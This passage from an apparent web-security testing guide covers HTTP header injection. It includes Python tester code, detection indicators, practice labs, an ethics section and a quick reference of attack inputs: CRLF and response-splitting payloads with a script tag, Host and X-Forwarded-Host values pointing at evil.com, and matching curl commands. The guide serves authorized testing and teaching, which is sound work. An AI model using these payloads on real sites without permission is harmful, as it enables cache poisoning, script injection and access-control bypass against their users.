                    'response_preview': response.text[:200],
                    'severity': 'high'
                }
            else:
                results['filename_injection'] = {'vulnerable': False}
                
        except requests.RequestException as e:
            results['filename_injection'] = {'error': str(e)}
        
        # Test content injection
        try:
            files = {
                upload_field: ('test.txt', malicious_content.encode(), 'text/plain')
            }
            
            response = self.session.post(url, files=files, timeout=30)
            
            if 'X-Injected' in str(response.headers) or 'X-Injected' in response.text:
                results['content_injection'] = {
                    'vulnerable': True,
                    'status_code': response.status_code,
                    'response_preview': response.text[:200],
                    'severity': 'high'
                }
            else:
                results['content_injection'] = {'vulnerable': False}
                
        except requests.RequestException as e:
            results['content_injection'] = {'error': str(e)}
        
        return results
```

## Detection Indicators

### Header Injection Artifacts
- Unexpected headers in HTTP responses
- CRLF sequences in response headers or body
- Multiple Set-Cookie headers from single request
- Modified Content-Type or Location headers
- Injection of authentication headers
- Response splitting indicators

### Cache Poisoning Artifacts
- Different content served with poisoned headers
- Cache HIT status with modified content
- Vary header missing for poisoned headers
- Multiple content versions cached
- Unexpected redirects or content changes

### Access Control Bypass Artifacts
- Successful access to protected resources via headers
- Administrative functionality accessible via IP spoofing headers
- Authentication bypass through header manipulation
- Privilege escalation via header injection

## Impact Assessment

### Vulnerability Severity
- **Critical**: Full system compromise, data breach, authentication bypass
- **High**: Significant security impact, XSS, cache poisoning
- **Medium**: Limited security impact, information disclosure
- **Low**: Minor security issues, missing headers

### Business Impact
- **Data Breach**: Potential exposure of sensitive data
- **Account Takeover**: Authentication/authorization bypass
- **Reputation Damage**: Public disclosure of vulnerabilities
- **Compliance Violations**: Failure to meet security standards
- **Financial Loss**: Remediation costs, potential fines

## Common Pitfalls

### Testing Pitfalls
- **False Positives**: Misinterpreting normal behavior as vulnerabilities
- **False Negatives**: Missing actual vulnerabilities due to incomplete testing
- **Scope Creep**: Testing beyond authorized boundaries
- **Rate Limiting**: Triggering security controls during testing
- **Encoding Issues**: Not properly handling encoded payloads
- **Proxy Interference**: Not accounting for proxy behavior
- **Timeout Issues**: Not handling slow responses properly
- **Error Handling**: Not gracefully handling request errors

### Implementation Pitfalls
- **Overly Complex Payloads**: Using payloads that are easily detected
- **Insufficient Testing**: Not testing all possible injection points
- **Missing Context**: Not understanding application-specific behavior
- **Inadequate Documentation**: Poor documentation of findings
- **No Regression Testing**: Not implementing automated regression tests
- **Ignoring Edge Cases**: Not testing unusual input combinations

## Integration Points

### CI/CD Integration
```yaml
# GitHub Actions workflow
name: Header Injection Testing
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Run header injection tests
        run: python -m header_injection_tester scan --config config.yaml
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: test-results
          path: results/
```

### Monitoring Integration
```python
# Real-time monitoring
import time
from datetime import datetime

class HeaderSecurityMonitor:
    def __init__(self):
        self.alerts = []
        self.metrics = {}
    
    def monitor_header_security(self, urls: List[str], 
                               interval: int = 3600):
        """Monitor header security continuously"""
        while True:
            for url in urls:
                analyzer = SecurityHeaderAnalyzer()
                analysis = analyzer.analyze_headers(url)
                
                if 'error' not in analysis:
                    # Check for critical issues
                    if analysis['overall_score'] < 50:
                        self.send_alert(url, analysis)
            
            time.sleep(interval)
    
    def send_alert(self, url: str, analysis: Dict):
        """Send alert for security issues"""
        alert = {
            'url': url,
            'score': analysis['overall_score'],
            'missing': [h['header'] for h in analysis['missing_headers']],
            'timestamp': datetime.now().isoformat()
        }
        self.alerts.append(alert)
```

### Reporting Integration
```python
class HeaderSecurityReporter:
    def generate_report(self, findings: List[Dict]) -> Dict:
        """Generate comprehensive security report"""
        report = {
            'summary': {
                'total_findings': len(findings),
                'critical': len([f for f in findings if f['severity'] == 'critical']),
                'high': len([f for f in findings if f['severity'] == 'high']),
                'medium': len([f for f in findings if f['severity'] == 'medium']),
                'low': len([f for f in findings if f['severity'] == 'low']),
            },
            'findings': findings,
            'recommendations': self._generate_recommendations(findings),
            'generated_at': datetime.now().isoformat()
        }
        
        return report
    
    def _generate_recommendations(self, findings: List[Dict]) -> List[Dict]:
        """Generate remediation recommendations"""
        recommendations = []
        
        for finding in findings:
            if finding['vulnerability_type'] == 'CRLF Injection':
                recommendations.append({
                    'finding': finding['url'],
                    'recommendation': 'Implement input validation to remove CRLF characters',
                    'priority': 'high',
                    'effort': 'low'
                })
            elif finding['vulnerability_type'] == 'Cache Poisoning':
                recommendations.append({
                    'finding': finding['url'],
                    'recommendation': 'Update cache configuration to include security headers in cache key',
                    'priority': 'critical',
                    'effort': 'medium'
                })
        
        return recommendations
```

## Practice Labs

### Lab 1: CRLF Injection Testing
Create a CRLF injection tester that:
1. Tests all parameters for CRLF injection
2. Tests both GET and POST methods
3. Handles different encoding bypasses
4. Generates evidence for findings

### Lab 2: Cache Poisoning Detection
Build a cache poisoning detector that:
1. Tests common cache poisoning headers
2. Identifies cache key weaknesses
3. Demonstrates impact of poisoning
4. Generates remediation recommendations

### Lab 3: Security Header Analysis
Develop a security header analyzer that:
1. Checks all required security headers
2. Validates header values
3. Tests for bypass techniques
4. Generates compliance reports

### Lab 4: Access Control Bypass Testing
Create an access control tester that:
1. Tests header-based access control bypass
2. Identifies administrative endpoints
3. Tests privilege escalation via headers
4. Documents bypass techniques

### Lab 5: Comprehensive Testing Suite
Build a complete header injection testing suite that:
1. Integrates all testing components
2. Provides unified reporting
3. Supports automated testing
4. Offers dashboard visualization

## Ethics

### Responsible Header Injection Testing
- **Authorization**: Only test applications with explicit permission
- **Scope Respect**: Stay within authorized testing boundaries
- **Rate Limiting**: Implement delays to avoid denial of service
- **Data Handling**: Treat all captured data as potentially sensitive
- **Impact Awareness**: Be aware of potential impact on production systems
- **Credential Security**: Don't log or expose credentials
- **Disclosure**: Report findings through responsible channels
- **Documentation**: Maintain audit trail of all testing activities
- **Privacy**: Handle personal data according to regulations
- **Cleanup**: Remove test data and artifacts after testing

## Quick Reference

### Common Header Injection Payloads
```bash
# CRLF Injection
%0d%0a
%0D%0A
\r\n
%0d%0aSet-Cookie:crlf=test
%0d%0aX-Injected-Header:crlf

# Response Splitting
%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>

# Host Header Injection
evil.com
evil.com:80
127.0.0.1
localhost

# Cache Poisoning Headers
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### Security Headers Checklist
```yaml
Required Headers:
  - Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  - Content-Security-Policy: default-src 'self'
  - X-Content-Type-Options: nosniff
  - X-Frame-Options: DENY or SAMEORIGIN
  - X-XSS-Protection: 1; mode=block
  - Referrer-Policy: strict-origin-when-cross-origin
  - Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Testing Commands
```bash
# Test CRLF injection
curl -v "https://target.com/?param=%0d%0aX-Injected:value"

# Test Host header injection
curl -v -H "Host: evil.com" https://target.com

# Test cache poisoning
curl -v -H "X-Forwarded-Host: evil.com" https://target.com

# Check security headers
curl -I https://target.com
```

### Troubleshooting Quick Fixes
1. **False positives**: Verify injection manually, check response carefully
2. **Bypass detection**: Try different encoding techniques
3. **Rate limiting**: Add delays between requests
4. **Timeout issues**: Increase timeout values
5. **Proxy issues**: Test without proxy first
6. **Encoding issues**: Handle URL encoding properly
7. **Session issues**: Implement proper authentication
8. **Error handling**: Handle network errors gracefully
